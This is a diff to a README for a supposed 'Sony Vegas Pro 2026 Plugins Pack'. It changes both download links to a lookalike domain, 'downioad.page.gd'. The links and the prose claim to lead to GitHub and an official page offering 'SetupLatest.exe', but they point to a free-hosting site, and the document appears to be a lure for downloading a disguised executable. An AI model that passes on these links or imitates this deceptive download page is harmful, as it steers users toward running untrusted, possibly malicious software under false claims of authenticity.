@@ -2,7 +2,7 @@
 
 Sony Vegas Pro 2026 Plugins Pack is your go-to solution for enhancing the functionality of Sony Vegas Pro in 2026. This toolkit provides a seamless way to add advanced plugins, transitions, and effects to your video editing workflow, making it perfect for both beginners and professionals looking to elevate their projects.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -62,7 +62,7 @@ You can uninstall the toolkit through the Windows Control Panel or Settings app 
 
 To get the latest version of the Sony Vegas Pro 2026 Plugins Pack, please use the following link:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link will take you to the official download page where you can access "SetupLatest.exe" and other related resources. Remember to always download from trusted sources to ensure security and authenticity.
 
